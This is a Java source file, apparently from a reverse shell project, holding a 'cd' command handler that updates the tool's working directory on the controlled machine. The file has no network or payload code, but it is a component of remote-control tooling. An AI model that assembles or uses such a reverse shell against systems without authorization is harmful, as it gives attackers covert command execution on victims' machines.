package com.mtattab.reverseshell.service.commands;

import com.mtattab.reverseshell.model.CommandRestOutput;
import com.mtattab.reverseshell.service.Command;
import com.mtattab.reverseshell.util.DataManipulationUtil;
import com.mtattab.reverseshell.util.SystemCommandProxyUtil;

import java.io.File;
import java.util.ArrayList;
import java.util.List;

public class ChangeDirectoryCommand implements Command {
    @Override
    public CommandRestOutput executeCommand(String command) {
        List<String> commands = new ArrayList<>( DataManipulationUtil.stringToList(command, " "));
//        edge cases
        if (commands.get(0).equalsIgnoreCase("cd")){
            commands.remove(0);
            return CommandRestOutput.builder().output(changeDirectory(String.join(" ", commands)))
                    .build() ;

        }
        return CommandRestOutput.builder().output("there is a problem with the command")
                .build() ;
    }

    private String changeDirectory(String path) {
        File relativeDirectory = new File(SystemCommandProxyUtil.currentWorkingDir, path);
        File absoluteDirectory = new File(path);


        if (relativeDirectory.exists() && relativeDirectory.isDirectory()) {
            SystemCommandProxyUtil.currentWorkingDir = relativeDirectory;
            return "Directory changed successfuly";
        } else if (absoluteDirectory.exists() && absoluteDirectory.isDirectory()) {
            SystemCommandProxyUtil.currentWorkingDir = absoluteDirectory;
            return "Directory changed successfuly";
        } else {

            return "Directory not found: " + path;
        }
    }



}
